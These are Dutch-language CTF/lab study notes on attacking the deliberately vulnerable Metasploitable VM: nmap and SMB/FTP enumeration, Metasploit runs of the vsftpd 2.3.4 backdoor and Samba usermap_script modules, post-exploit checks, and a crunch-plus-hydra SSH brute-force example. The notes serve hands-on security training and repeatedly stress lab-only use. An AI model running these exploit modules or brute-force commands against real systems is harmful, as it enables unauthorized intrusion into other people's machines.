# Metasploitable — overzicht en praktische structuur

Korte introductie
Metasploitable is een doelmachine met veel bekende kwetsbaarheden, bedoeld om te oefenen met scanners, exploits en post-exploit technieken. Deze samenvatting bevat een compacte workflow: reconnaissance, kwetsbaarheidsonderzoek, exploiteren en post-exploit stappen, plus een commando-legende.

Doel van deze notities

- Houvast bij CTFs en labs.
- Concrete commando's met korte uitleg.
- Veilig oefenen: alleen op je eigen lab of met expliciete toestemming.

Workflow (kort)

1. Reconnaissance: ontdek hosts en services (`nmap`, `netdiscover`)
2. Enumeratie: verdiep je in gevonden services (`smbclient`, `enum4linux`, `dirsearch`)
3. Exploitatie: gebruik bekende exploits (`msfconsole`, vsftpd backdoor, samba modules)
4. Post-exploit: shell, privileges, checks (`whoami`, `uname -a`, files)

## Korte extra tips (originele notities)

- `rlogin -l root <host>`: oud remote login-protocol (vaak niet aanwezig op moderne systemen).
- `su` / `sudo su`: privilege escalation commands op Linux wanneer je credentials hebt.
- `winscp`: GUI/SFTP client voor Windows.
- FTP: controleer poort 21 en probeer anonieme login (`USER anonymous`).
- Soms openen kwetsbare services een backdoorpoort (bv. in notities `6200/tcp`). Controleer verdachte open poorten.
- `telnet <host> 21` kan gebruikt zijn voor interactie met een service; `^]` is de telnet-escape.
- `reverse shell`: slachtoffer maakt verbinding terug naar aanvaler's listener — gebruik alleen in een lab.
- `cvedetails.com`: bron voor CVE-info.
- `fail2ban`: service die brute-force IP's blokkeert.
- `vps` / `IaaS`: context over hostingmodellen (Virtual Private Server, Infrastructure as a Service).

Voorbeelden met Metasploit (opruimen van notities):

```bash
sudo msfdb run
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.189.4
run
```

Opmerking: in de ruwe notities stonden wat typfouten (`whami` → `whoami`) en losse regels zoals "ww ingeven maakt niet uut welke" die ik heb verwijderd of verduidelijkt.

## Reconnaissance

Voorbeeld:

```bash
nmap 192.168.189.0/24
netdiscover -r 192.168.189.0/24
```

Korte uitleg opties:

## Enumeratie per service

   ```bash
   ftp 192.168.189.4
   USER anonymous
   PASS whatever
   get flag.txt
   ```

   ```bash
   smbclient -L 192.168.189.4
   enum4linux -a 192.168.189.4
   ```

   ```bash
   dirsearch -u http://192.168.189.4
   ```

## Exploitatie (voorbeeldstappen)

   ```bash
   msfconsole
   search vsftpd
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 192.168.189.4
   run
   ```

   ```bash
   use auxiliary/admin/smb/samba_symlink_traversal
   set RHOSTS 192.168.189.4
   run

   use exploit/multi/samba/usermap_script
   set RHOSTS 192.168.189.4
   set LHOST <jouw_ip>
   run
   ```

Let op: kies de juiste module en lees `show options` voordat je `run` uitvoert.

## Post-exploit / verificatie

   ```bash
   whoami
   uname -a
   ```

   ```bash
   ls -la /home
   tree /home
   strings /path/to/binary_or_file
   ```

## Web-kwetsbaarheden en oefenapps

   1. Stored XSS — payload opgeslagen op server
   2. Reflected XSS — payload in URL/response
   3. DOM-based XSS — kwetsbaarheid in client-side JS

## Reverse shell (kort)

Een reverse shell maakt vanaf het slachtoffer een verbinding terug naar jouw machine (handig bij NAT/Firewall). Gebruik alleen in je eigen lab.

## Hulpmiddelen & bronnen

- `cvedetails.com` — zoek CVE-informatie en patches.
- `Exploit-DB` / `Metasploit` — voorbeelden van exploits en PoC's.
- `fail2ban` — beschermt servers tegen brute-force door IP's te blokkeren.
- `winscp` — Windows SFTP/SCP GUI-client.
- Documentatie: lees altijd `man <tool>` of `tool --help` voor opties.

## Commando-legenda (kort)

- `nmap`: netwerkscanner. Opties: `-p-` (alle poorten), `-sV` (serviceversie), `-n` (geen DNS).
- `netdiscover -r <CIDR>`: zoek hosts in lokaal subnet.
- `ftp`: FTP-client; gebruik `USER <name>`, `PASS <pw>`, `get <file>`.
- `telnet <host> <port>`: eenvoudige TCP-client (gebruik `^]` om te escape in telnet).
- `rlogin -l <user> <host>`: oud remote-login protocol (weinig gebruikt).
- `smbclient -L <host>`: lijst SMB-shares.
- `enum4linux -a <host>`: uitgebreide Samba/SMB enumeratie.
- `dirsearch -u <url>`: brute-force webdirectories.
- `msfconsole`: Metasploit CLI; `search`, `use`, `set`, `run`.
- `strings <file>`: print leesbare tekst in binaire bestanden.
- `crunch <min> <max> -t <pattern> > file`: genereer woordlijst volgens patroon.
- `hydra -l <user> -P <pwlist> ssh://<host> -s <port>`: parallelle login cracker.

Voorbeeld (woordenlijst + hydra):

```bash
crunch 7 7 -t ,%Flesh > Flesh.wordlist
hydra -l RickSanchez -P Flesh.wordlist ssh://192.168.189.8 -s 22222
```

Belangrijk: noteer altijd welke `-m`/`-a`/`-r` combinaties je gebruikt bij brute-force tests en stop als je geen expliciete toestemming hebt.
